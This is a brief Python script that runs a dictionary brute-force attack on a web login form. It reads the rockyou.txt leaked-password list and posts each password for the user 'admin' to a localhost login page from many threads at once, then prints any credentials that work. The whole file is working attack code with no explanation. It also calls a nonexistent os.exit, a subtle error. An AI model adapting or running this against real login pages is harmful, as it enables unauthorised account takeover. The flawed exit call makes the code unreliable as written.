import requests
import time
import concurrent.futures
import os

uname = 'admin'

def test_password(p):
    url = 'http://127.0.0.1:8000/login.html'
    payload = {'uname': uname, 'pword': p.strip()}
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}

    response = requests.post(url, headers=headers, data=payload)

    if "Failed" not in response.text:
        print("Login Successful")
        print("Username:Password is " + uname + ":" + p.strip())
        os.exit(0)

with open('rockyou.txt', mode='r', encoding='ISO-8859-1') as f:
    start_time = time.time()
    total = 0
    password_list = f.readlines()
    with concurrent.futures.ThreadPoolExecutor() as executor:
        for i, _ in enumerate(executor.map(test_password, password_list), 1):
            total += 1
            if i % 50 == 0:
                print(f"Tested {i} passwords in {time.time() - start_time:.2f} seconds")
                start_time = time.time()
                print(total)
